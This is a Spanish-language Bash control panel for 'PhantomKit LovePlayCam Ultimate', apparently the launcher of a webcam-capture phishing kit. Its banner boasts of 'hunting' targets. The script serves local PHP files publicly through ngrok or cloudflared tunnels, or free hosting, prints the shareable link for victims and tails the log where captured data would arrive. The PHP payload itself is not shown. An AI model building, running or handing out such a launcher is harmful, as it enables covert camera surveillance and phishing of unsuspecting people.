#!/bin/bash

clear
RED='\033[1;31m'
PINK='\033[1;35m'
WHITE='\033[1;37m'
RESET='\033[0m'

echo -e "${RED}"
echo "     ████████╗██╗  ██╗ █████╗ ███╗   ███╗██████╗  "
echo "     ╚══██╔══╝██║  ██║██╔══██╗████╗ ████║██╔══██╗ "
echo "        ██║   ███████║███████║██╔████╔██║██████╔╝ "
echo "        ██║   ██╔══██║██╔══██║██║╚██╔╝██║██╔═══╝  "
echo "        ██║   ██║  ██║██║  ██║██║ ╚═╝ ██║██║      "
echo "        ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝      "
echo -e "${PINK}"
echo "        🩷  PhantomKit LovePlayCam Ultimate  🩷"
echo -e "${WHITE}"
echo "   By Elite — para cazar con estilo y fuego 😈💘"
echo -e "${RESET}"
echo "🔥 PhantomKit LovePlayCam Ultimate - Control Panel 🔥"
echo "1) ngrok"
echo "2) cloudflared"
echo "3) Xposed (hosting manual)"
echo "Elige túnel (1-3): "
read opcion

echo "[*] Iniciando servidor PHP en localhost:8080..."
php -S 0.0.0.0:8080 > php.log 2>&1 &  
PHP_PID=$!
sleep 2

case $opcion in
  1)
    if [ ! -f "./ngrok" ]; then
      echo "[*] Descargando ngrok..."
      wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
      unzip ngrok-stable-linux-arm.zip
      chmod +x ngrok
    fi
    echo "[*] Iniciando ngrok..."
    ./ngrok http 8080 > ngrok.log 2>&1 &
    sleep 5
    LINK=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io')
    echo "🔗 Enlace ngrok: $LINK"
    ;;
  2)
    echo "[*] Iniciando Cloudflared..."
    cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 &
    sleep 8
    LINK=$(grep -o 'https://[-a-z0-9]*\.trycloudflare.com' cloudflared.log | head -n 1)
    echo "🔗 Enlace cloudflared: $LINK"
    ;;
  3)
    echo "[!] Opción Xposed: Sube manualmente los archivos a tu hosting gratuito"
    echo "    y comparte el enlace generado allí."
    ;;
  *)
    echo "❌ Opción inválida. Saliendo..."
    kill $PHP_PID
    exit 1
    ;;
esac

echo ""
echo "🔥 Logs PHP (últimas líneas):"
tail -f php.log
